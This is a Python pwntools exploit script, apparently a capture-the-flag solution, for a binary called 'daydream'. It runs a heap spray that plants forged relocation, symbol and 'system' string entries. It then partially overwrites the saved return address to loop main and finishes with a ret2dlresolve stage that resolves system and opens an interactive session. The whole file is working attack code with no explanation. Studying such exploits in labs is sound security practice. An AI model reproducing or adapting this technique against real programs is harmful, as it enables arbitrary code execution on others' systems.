#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('daydream')
libc = ELF('libc.so.6')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def getPIEBase(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").read().splitlines()
    return int(memory_map[0].split(b"-")[0], 16)

def getHeapBase(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").read().splitlines()
    return int(memory_map[5].split(b"-")[0], 16)

class Payload():
    def __init__(self):
        self.p = b''

    def write(self, where, what):
        self.p += f"{where} {what}\n".encode()

    def WWW(self, offset, what): 
        for i, e in enumerate(what):
            self.write(offset+i, e)
    
    def fill(self):
        if len(self.p) > 0x2000:
            self.p = self.p[:0x2000]
        self.p = self.p.ljust(0x2000, b'\0')
    
    def fill_n(self, n):
        self.p = self.p.ljust(n, b'\0')

    def ret(self):
        self.p += b"0 1\n"
    
    def insert_at(self, n, m):
        if n < len(self.p):
            return
        
        self.fill_n(n)
        self.p += m


context.terminal = ['xfce4-terminal', '-e']
gdbscript = '''
#b *main+158
#b *main+121
b *main-160
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

if args.GDB:
    pie_base = getPIEBase(io)
    print(f'{pie_base = :x}')
    print(f'.rel.plt 0x{pie_base + exe.get_section_by_name(".rela.plt").header.sh_addr :x}')
    print(f'.dynsym  0x{pie_base + exe.get_section_by_name(".dynsym").header.sh_addr :x}')
    print(f'.dynstr  0x{pie_base + exe.get_section_by_name(".dynstr").header.sh_addr :x}')

saved_rip = 0x38
main_stack = saved_rip + 0x10
resolver_arg = saved_rip + 0x18

offset_from_exe = (0X5000   # Size of exe in memory
                + 0x2000000 # Max size between exe and heap
                + 0x500     # Offset from start of heap
                )
assert (offset_from_exe - exe.get_section_by_name(".rela.plt").header.sh_addr)%0x18 == 0, f'Not aligned: {offset_from_exe - exe.get_section_by_name(".rela.plt").header.sh_addr}'
assert (offset_from_exe + 0x18 + 8 - exe.get_section_by_name(".dynsym").header.sh_addr)%0x18 == 0, f'Not aligned: {offset_from_exe + 0x18 - exe.get_section_by_name(".dynsym").header.sh_addr}'

idx_jmprel = (offset_from_exe - exe.get_section_by_name(".rela.plt").header.sh_addr) // 0x18
idx_symtab = (offset_from_exe + 0x18 + 8 - exe.get_section_by_name(".dynsym").header.sh_addr) // 0x18
idx_strtab = (offset_from_exe - exe.get_section_by_name(".dynstr").header.sh_addr  + 0x18 + 0x18 + 2)
if args.GDB:
    print(f'{idx_jmprel = :x}\n{idx_symtab = :x}\n{idx_strtab = :x}')

fake_jmprel = (p64(0x4018)      # r_offset: GOT addr
             + p32(7)           # r_info_lo: 
             + p32(idx_symtab)  # r_info_hi: index in symtab 
             + p64(0)           # r_addend
             + b'\0'*8 # alignement
             )

fake_symtab = (p32(idx_strtab)  # st_name 
            +  p8(0x12)         # st_info
            +  p8(0)            # st_other
            +  p32(0)           # st_shndx
            +  p64(0)           # st_size
            )

fake_strtab = b'system\0'

fake_rel = fake_jmprel + fake_symtab + fake_strtab

#################
# 1: heap spray #
#################
for i in range(0x1000):
    p = Payload()
    # Overwrite LSB to restart main
    p.WWW(saved_rip, p8(0x76))
    p.ret()
    payloads = sorted([
            ((0x260-(i*0x10))%0x2000, fake_rel),
            ((0x260+0x1000-(i*0x10))%0x2000, fake_rel)
        ],
        key = lambda x: x[0]
    )
    for addr, pay in payloads:
        p.insert_at(addr, pay)
    p.fill()
    io.send(p.p)

if args.GDB:
    heap_base = getHeapBase(io)
    target_addr = pie_base + 0x5000 + 0X2000000 + 0x500
    chunk_idx = (target_addr - (heap_base + 0x290))//0x2010
    chunk_addr = heap_base + 0x290 + (chunk_idx*0x2010)
    offset_within_chunk = target_addr - (chunk_addr + 0x10)
    print(f'{heap_base = :x}')
    print(f'{target_addr = :x}')
    print(f'{chunk_idx = :x}')
    print(f'{chunk_addr = :x}')
    print(f'{offset_within_chunk = :x}')

#################
# 2: trick main #
#################
input('Part2 ?')
p = Payload()
# Overwrite LSB to restart main
p.WWW(saved_rip, p8(0x76))
# Overwrite LSB to main addr in stack to call main+16
p.WWW(main_stack, p8(0xd0))
# index in .rela.plt
p.WWW(resolver_arg, p64(idx_jmprel))
p.ret()
p.fill()
print(p.p[:0X50])
io.send(p.p)

####################
# 3: ret2dlresolve #
####################
input('Part3 ?')
p = Payload()
# ret to dlresolver
p.WWW(saved_rip, p8(0x20))
p.ret()
p.fill()
print(p.p[:0X50])
io.send(p.p)

io.interactive()

